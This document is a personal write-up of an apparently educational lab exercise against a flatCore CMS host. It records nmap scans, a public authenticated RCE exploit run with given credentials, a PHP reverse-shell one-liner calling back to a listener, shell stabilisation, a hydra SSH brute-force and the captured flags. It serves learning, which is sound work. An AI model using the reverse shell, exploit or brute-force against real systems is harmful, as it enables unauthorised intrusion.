# Domain Info
*domain*: target1.ine.local
*IP*: 192.98.23.3

# Enumeration
-> on web credentials provided `admin:password1` .
-> usefull wordlists
```shell
- /usr/share/nmap/nselib/data/wp-plugins.lst
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

-> *CMS* : flatCore CMS
## Port Scan
```shell
sudo nmap --min-rate 1000 -p- target1.ine.local
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http
	MAC Address: 02:42:C0:62:17:03 (Unknown)
```
## Service Scan
```shell
sudo nmap -sV -A -T4 -oX target1.xml target1.ine.local

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 21:24:4c:9e:7b:6b:7f:b9:ff:35:fd:b7:72:e9:b3:c2 (RSA)
	|   256 32:b1:fc:9d:50:e4:3c:28:ee:18:16:2f:73:91:0a:13 (ECDSA)
	|_  256 e0:51:b7:4f:d0:b1:a3:35:88:5b:51:4e:b9:53:59:1a (ED25519)
	
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	| http-robots.txt: 4 disallowed entries 
	|_/acp/ /core/ /lib/ /modules/
	|_http-generator: flatCore
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	|_http-title: Homepage

	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Exploitation
## searchsploit
``` shell
searchsploit flatCore

	FlatCore CMS 2.0.7 - Remote Code Execution (RCE)  (Authenticated) |php/webapps/50262.py
	FlatCore CMS 2.1.1 - Stored Cross-Site Scripting (XSS) | php/webapps/51068.txt

-> /usr/share/exploitdb/exploits/php/webapps/50262.py
```

# Exploiting Poc
```shell
cp /usr/share/exploitdb/exploits/php/webapps/50262.py exploit.py
python3 exploit.py http://target1.ine.local admin password1  

# found flag1
cat /flag1.txt
FLAG1{2c9e54968a88463ab7f3798b237fbe66}
# shell is not stable so making stable
# payload
php -r '$sock=fsockopen("192.98.23.2",4444);system("/bin/sh <&3 >&3 2>&3");'

# listner
ncat -nvlp 4444

# making stable
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm 
#press ctrl+z
stty raw -echo && fg # more stable

```

### trying bruteforcing on found user
```shell

- hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 35 ssh://target1.ine.local
	
	[22][ssh] host: target1.ine.local   login: iamaweakuser   password: angel
# found creds....
```

-> Just Learned new thing that sometime user enum will not work and 
for bruteforcing services with found user work.
	-> user found in shell > bruteforce ssh with that

```shell
ssh iamaweakuser@target1.ine.local
cat flag2.txt
FLAG2{40cc2dfcffe942978704242cf646fd5c}
```

